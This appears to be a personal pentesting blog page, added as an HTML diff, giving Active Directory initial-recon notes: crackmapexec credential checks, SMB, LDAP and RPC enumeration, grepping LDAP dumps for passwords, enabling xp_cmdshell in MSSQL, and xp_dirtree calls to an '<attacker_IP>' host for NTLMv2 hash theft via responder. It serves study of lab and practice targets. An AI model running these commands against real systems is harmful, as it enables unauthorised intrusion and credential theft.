@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>CentHack | Welcome to my blog!!</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="CentHack" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Welcome to my blog!!" />
+<meta property="og:description" content="Welcome to my blog!!" />
+<link rel="canonical" href="http://localhost:4000/pages/inital-recon-ad.html" />
+<meta property="og:url" content="http://localhost:4000/pages/inital-recon-ad.html" />
+<meta property="og:site_name" content="CentHack" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="CentHack" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Welcome to my blog!!","headline":"CentHack","url":"http://localhost:4000/pages/inital-recon-ad.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>CentHack</h1>
+        </a>
+        <h2>Welcome to my blog!!</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="initial-recon">Initial Recon</h1>
+
+<h3 id="crackmapexec">CRACKMAPEXEC</h3>
+
+<p>We perform a full network analysis</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.0.2.0/24                                      
+SMB         10.0.2.11       445    BAYEK-PC         <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:BAYEK-PC<span class="o">)</span> <span class="o">(</span>domain:ASSASSINS.local<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.0.2.2        445    DESKTOP-2661V8G  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 19041 x64 <span class="o">(</span>name:DESKTOP-2661V8G<span class="o">)</span> <span class="o">(</span>domain:DESKTOP-2661V8G<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.0.2.10       445    MASYAF-DC        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:MASYAF-DC<span class="o">)</span> <span class="o">(</span>domain:ASSASSINS.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>If we have credentials we can try to login using a variety of services:</p>
+
+<ul>
+  <li>ssh</li>
+  <li>mssql</li>
+  <li>smb</li>
+  <li>winrm</li>
+  <li>ftp</li>
+  <li>rdp</li>
+  <li>ldap</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.0.2.10 <span class="nt">-u</span> <span class="s2">"administrator"</span> <span class="nt">-p</span> <span class="s1">'P$$$ssl345'</span>
+SMB         10.0.2.10       445    MASYAF-DC        <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:MASYAF-DC<span class="o">)</span> <span class="o">(</span>domain:ASSASSINS.local<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.0.2.10       445    MASYAF-DC        <span class="o">[</span>+] ASSASSINS.local<span class="se">\a</span>dministrator:P<span class="nv">$$$ssl345</span> <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>When we try to login using crackmapexec and we see (Pwn3d!) in any machines means that can execute commands. If we are using SMB then it also means that we have local administrative privileges on that machine.</p>
+
+<h3 id="smb">SMB</h3>
+
+<h3 id="null-session">Null session</h3>
+
+<p>First of all we would try to connect with a guest session</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span>  <span class="se">\\\\</span>10.10.11.222<span class="se">\\</span>              
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\k</span>ali]:
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        C<span class="nv">$ </span>             Disk      Default share
+        Department Shares Disk      
+        Development     Disk      
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.11.222 <span class="nt">-u</span> <span class="s2">"%"</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>                                
+                                                                                                    
+<span class="o">[</span>+] IP: 10.10.11.222:445        Name: authority.htb             Status: Guest session   
+        Disk                                                    Permissions     Comment
+        <span class="nt">----</span>                                                    <span class="nt">-----------</span>     <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>                                                 NO ACCESS       Remote Admin
+        C<span class="nv">$ </span>                                                     NO ACCESS       Default share
+        Department Shares                                       NO ACCESS
+        Development                                             READ ONLY
+        IPC<span class="nv">$ </span>                                                   READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        SYSVOL                                                  NO ACCESS       Logon server share
+</code></pre></div></div>
+
+<h3 id="connect-to-a-share">Connect to a share</h3>
+
+<p>If we want to connect to any share we can use smbclient</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient  <span class="se">\\\\</span>10.10.11.222<span class="se">\\</span>Development
+</code></pre></div></div>
+
+<p>With credentials would be as follows</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>10.0.2.10<span class="se">\\</span> <span class="nt">-U</span> ASSASSINS/administrator%<span class="s1">'P$$$ssl345'</span>
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+        assassinsfiles  Disk      The assassins storage
+        C<span class="nv">$ </span>             Disk      Default share
+        IPC<span class="nv">$ </span>           IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.0.2.10 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<p>If we don’t know the domain we can try to login without it. If we use WORKGROUP as the domain then we will perform a local login in that machine, with no domains involved.</p>
+
+<h3 id="mount-a-share-in-linux">Mount a share in Linux</h3>
+
+<p>This is useful if we don’t want to be using smbclient CLI. In order to mount a SMB share in a linux directory we have to install cifs tools.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>cifs-utils
+</code></pre></div></div>
+
+<p>Now we simply create a folder where the share will be mounted and we mount the share there.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo mkdir</span> /mnt/development
+<span class="nb">sudo </span>mount <span class="nt">-t</span> cifs //10.10.11.222/Development /mnt/development <span class="nt">-o</span> <span class="nv">username</span><span class="o">=</span>shareuser,password<span class="o">=</span>sharepassword,domain<span class="o">=</span>nixcraft
+</code></pre></div></div>
+
+<ul>
+  <li>Maybe a share is the wwwroot for a server</li>
+</ul>
+
+<h3 id="ldap">LDAP</h3>
+
+<p>Extract everything from domain</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-b</span> <span class="s2">"DC=htb,DC=local"</span>
+ldapsearch <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-x</span> <span class="nt">-s</span> base namingcontexts
+ldapsearch <span class="nt">-H</span> ldap://&lt;IP&gt; <span class="nt">-b</span> <span class="s2">"DC=support,DC=htb"</span> <span class="nt">-U</span> &lt;user&gt; <span class="nt">-w</span> &lt;pass&gt;
+ldapsearch <span class="o">[</span><span class="nt">-x</span><span class="o">]</span> <span class="nt">-H</span> ldap://&lt;IP address&gt; <span class="nt">-D</span> <span class="s1">'&lt;DOMAIN&gt;\&lt;username&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+ldapsearch <span class="o">[</span><span class="nt">-x</span><span class="o">]</span> <span class="nt">-H</span> ldap://172.16.224.10  <span class="nt">-D</span> <span class="s1">'&lt;USERNAME&gt;@&lt;DOMAIN&gt;'</span> <span class="nt">-w</span> <span class="s1">'&lt;PASSWORD&gt;'</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TLD&gt;"</span>
+</code></pre></div></div>
+
+<p>Another tool we can use is <a href="http://windapsearch.py"><strong>windapsearch.py</strong></a></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./windapsearch.py <span class="nt">-d</span> htb.local <span class="nt">--dc-ip</span> 10.10.10.161 <span class="nt">-U</span>
+<span class="o">[</span>+] No username provided. Will try anonymous bind.
+<span class="o">[</span>+] Using Domain Controller at: 10.10.10.161
+<span class="o">[</span>+] Getting defaultNamingContext from Root DSE
+<span class="o">[</span>+]     Found: <span class="nv">DC</span><span class="o">=</span>htb,DC<span class="o">=</span><span class="nb">local</span>
+<span class="o">[</span>+] Attempting <span class="nb">bind</span>
+<span class="o">[</span>+]     ...success! Binded as: 
+<span class="o">[</span>+]      None
+
+<span class="o">[</span>+] Enumerating all AD <span class="nb">users</span>
+<span class="o">[</span>+]     Found 30 <span class="nb">users</span>:
+
+cn: Sebastien Caron
+userPrincipalName: sebastien@htb.local
+
+cn: Lucinda Berger
+userPrincipalName: lucinda@htb.local
+
+cn: Andy Hislip
+userPrincipalName: andy@htb.local
+
+cn: Mark Brandt
+userPrincipalName: mark@htb.local
+
+cn: Santi Rodriguez
+userPrincipalName: santi@htb.local
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/machines/windows/intelligence]
+└─<span class="nv">$ </span>windapsearch.py <span class="nt">--dc-ip</span> 10.10.10.248 <span class="nt">-u</span> <span class="s1">'Tiffany.Molina@intelligence.htb'</span> <span class="nt">-p</span> <span class="s1">'NewIntelligenceCorpUser9876'</span> <span class="nt">--users</span>                     
+<span class="o">[</span>+] Using Domain Controller at: 10.10.10.248
+<span class="o">[</span>+] Getting defaultNamingContext from Root DSE
+<span class="o">[</span>+]     Found: <span class="nv">DC</span><span class="o">=</span>intelligence,DC<span class="o">=</span>htb
+<span class="o">[</span>+] Attempting <span class="nb">bind</span>
+<span class="o">[</span>+]     ...success! Binded as: 
+<span class="o">[</span>+]      u:intelligence<span class="se">\T</span>iffany.Molina
+
+<span class="o">[</span>+] Enumerating all AD <span class="nb">users</span>
+<span class="o">[</span>+]     Found 41 <span class="nb">users</span>:
+</code></pre></div></div>
+
+<p>When enumerating the full tree there are various ways we can take to find strange fields in the tree. In order to do this we will export the full LDAP tree to a file and use regex to find interesting information.</p>
+
+<h3 id="searching-for-common-strings">Searching for common strings</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>full_tree.txt | <span class="nb">grep</span> <span class="nt">-iE</span> <span class="s2">"password|pass|passwd|pwd|pw"</span>
+</code></pre></div></div>
+
+<h3 id="searching-users">Searching users</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>full_tree.txt | <span class="nb">grep </span>sAMAccountName
+</code></pre></div></div>
+
+<p>Also we can target an specific user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>full_tree.txt| <span class="nb">grep </span>r.thompson <span class="nt">-A</span> 10 <span class="nt">-B</span> 31
+</code></pre></div></div>
+
+<h3 id="searching-by-descriptions">Searching by descriptions</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>full_tree.txt | <span class="nb">grep </span>description
+</code></pre></div></div>
+
+<h3 id="filtering-by-non-common-fields">Filtering by non-common fields</h3>
+
+<p>The typical fields in LDAP can be the following:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>^dn|^dc|^objectClass|^objectClass|^objectClass|^objectClass|^cn|^sn|^ou|^givenName|^distinguishedName|^instanceType|^whenCreated|^whenChanged|^displayName|^uSNCreated|^memberOf|^uSNChanged|^name|^objectGUID|^userAccountControl|^badPwdCount|^codePage|^countryCode|^badPasswordTime|^lastLogoff|^lastLogon|^pwdLastSet|^primaryGroupID|^objectSid|^accountExpires|^logonCount|^sAMAccountName|^sAMAccountType|^userPrincipalName|^objectCategory|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^dSCorePropagationData|^lastLogonTimestamp|^msDS-SupportedEncryptionTypes|^serverReference|^showInAdvancedViewOnly|^msDFSR-DirectoryFilter|^systemFlags|^#|^msDFSR-RootPath|^msDFSR-StagingPath|^msDFSR-Enabled|^msDFSR-Options|^msDFSR-ContentSetGuid|^msDFSR-ReplicationGroupGuid|^msDFSR-ReadOnly|^lastSetTime|^priorSetTime|^isCriticalSystemObject|^fSMORoleOwner|^rIDAvailablePool|^isCriticalSystemObject|^rIDAllocationPool|^rIDPreviousAllocationPool|^rIDUsedPool|^rIDNextRID|^member|^groupType|^scriptPath|^MemberReferenceBL|^ComputerReference|^FileFilter|^ReplicationGroupType|^ref|^msDFSR-MemberReference|^msDFSR-FileFilter|^servicePrincipalName|^dNSHostName:|^rIDSetReferences|^revision|^samDomainUpdates|^localPolicyFlags|^operatingSystem|^operatingSystemVersion|^operatingSystemServicePack|^creationTime|^forceLogoff|^lockoutDuration|^lockOutObservationWindow|^lockoutThreshold|^maxPwdAge|^minPwdAge|^minPwdLength|^modifiedCountAtLastProm|^nextRid|^pwdProperties|^pwdHistoryLength|^serverState|^uASCompat|^modifiedCount|^ipsecName|^ipsecID|^ipsecDataType|^ipsecData|^iPSECNegotiationPolicyType|^iPSECNegotiationPolicyAction|^ipsecID|^ipsecDataType|^ipsecData|^ipsecOwnersReference|^auditingPolicy|^description|^gPLink|^ipsecFilterReference|^ipsecISAKMPReference|^ipsecNFAReference|^ipsecNegotiationPolicyReference|^masteredBy|^ms-DS-MachineAccountQuota|^msDFSR-ComputerReference|^msDFSR-ComputerReferenceBL|^msDFSR-Flags|^msDFSR-ReplicationGroupType|^msDFSR-Version|^msDS-AllUsersTrustQuota|^msDS-Behavior-Version|^msDS-IsDomainFor|^msDS-NcType|^msDS-PerUserTrustQuota|^msDS-PerUserTrustTombstonesQuota|^msDS-TombstoneQuotaFactor|^msDs-masteredBy|^nTMixedDomain|^otherWellKnownObjects|^rIDManagerReference|^result|^search|^subRefs|^wellKnownObjects
+</code></pre></div></div>
+
+<p>We can use them with grep and the full tree to filter and see uncommon fields.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>full_tree.txt| <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"&lt;FIELD_1&gt; | &lt;FIELD_2 | ..."</span> | <span class="nb">sed</span> <span class="s1">'/^$/d'</span> | <span class="nb">grep</span> <span class="nt">-E</span> <span class="s2">"^.*?:"</span>
+</code></pre></div></div>
+
+<p><a href="https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf">https://troopers.de/downloads/troopers19/TROOPERS19_AD_Fun_With_LDAP.pdf</a></p>
+
+<h3 id="rpc">RPC</h3>
+
+<h3 id="login">Login</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;TARGET_IP&gt;
+rpcclient <span class="nt">-U</span> <span class="s2">"&lt;USERNAME&gt;[%&lt;PASSWORD&gt;]"</span> &lt;TARGET_IP&gt;
+rpcclient <span class="nt">-U</span> <span class="s2">"&lt;USERNAME&gt;%HASH"</span> <span class="nt">--pw-nt-hash</span> &lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<p>We could also enumerate endpoints with <strong>rpcmap.py</strong> from impacket or nay other tool from impacket that interacts with RPC.</p>
+
+<h3 id="ipv6">IPv6</h3>
+
+<p>If we don’t find nothing using IPv4 we can use IPv6. To obtain the IPv6 of the machine we can use https://github.com/mubix/IOXIDResolver</p>
+
+<h3 id="mssql">MSSQL</h3>
+
+<p>Default databases:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>master       
+
+tempdb       
+
+model        
+
+msdb
+
+Resource
+</code></pre></div></div>
+
+<h3 id="obtain-all-users-in-the-database">Obtain all users in the database</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">select * from sys.database_principals;</code></li>
+</ul>
+
+<h3 id="obtain-all-databases">Obtain all databases</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">SELECT name FROM master.dbo.sysdatabases;</code></li>
+</ul>
+
+<h3 id="get-tables">Get tables</h3>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">select * FROM &lt;DATABASE_NAME&gt;.INFORMATION_SCHEMA.TABLES;</code></li>
+</ul>
+
+<h3 id="execute-commands">Execute commands</h3>
+
+<p>Execute commands:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EXECUTE sp_configure <span class="s1">'Show Advanced Options'</span>, 1<span class="p">;</span> RECONFIGURE<span class="p">;</span> EXECUTE sp_configure <span class="s1">'xp_cmdshell'</span>, 1<span class="p">;</span> RECONFIGURE<span class="p">;</span>
+
+EXEC master..xp_cmdshell <span class="s1">'whoami'</span>
+</code></pre></div></div>
+
+<h3 id="steal-ntlmv2-hash">Steal NTLMv2 Hash</h3>
+
+<p>Steal NTLMv2 Hash</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xp_dirtree <span class="s1">'\\&lt;attacker_IP&gt;\any\thing'</span>
+<span class="nb">exec </span>master.dbo.xp_dirtree <span class="s1">'\\&lt;attacker_IP&gt;\any\thing'</span>
+EXEC master..xp_subdirs <span class="s1">'\\&lt;attacker_IP&gt;\anything\'</span>
+EXEC master..xp_fileexist <span class="s1">'\\&lt;attacker_IP&gt;\anything\'</span>
+</code></pre></div></div>
+
+<p>We must have enable a listener with responder or and SMB server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
+<span class="nb">sudo </span>impacket-smbserver share ./ <span class="nt">-smb2support</span>
+</code></pre></div></div>
+
+<h3 id="common-ports">Common ports</h3>
+
+<ul>
+  <li>Port 53 is open and is hosting a DNS service over TCP</li>
+  <li>Port 80 is open and is hosting an HTTP server</li>
+  <li>Port 88 is open and is hosting the kerberos service.</li>
+  <li>Ports 135 / 139 / 445 are open and are hosting the RPC / NetBIOS / SMB share services respectively.</li>
+  <li>Ports 389 / 3268 and 636 / 3269 are open and hosting the LDAP/S services respectively</li>
+  <li>Port 464 is open are hosting a Kerberos password change service, typically seen on DCs and generally not of much interest.</li>
+  <li>Ports 593 and 5722 are hosting RPC services.</li>
+  <li>Port 5985 is hosting the WinRM service, which will be good if credentials are found. 5986 is WinRM but SSL.</li>
+  <li>Port 9389 is hosting the .NET Message Framing service.</li>
+  <li>Ports 49xxx are hosting the high port RPC services.</li>
+</ul>
+
+<h3 id="bruteforce">Bruteforce</h3>
+
+<p>If we have perform a full recon over the domain a none of this services are accessible we want to try other simpler ways to have a foothold:</p>
+
+<ul>
+  <li>try username as password</li>
+  <li>username and append some payloads</li>
+  <li>try common passwords</li>
+  <li>try first letter username - full last name- a year</li>
+  <li>try username and the lastname</li>
+</ul>
+
+      </section>
+    </div>
+  </body>
+</html>
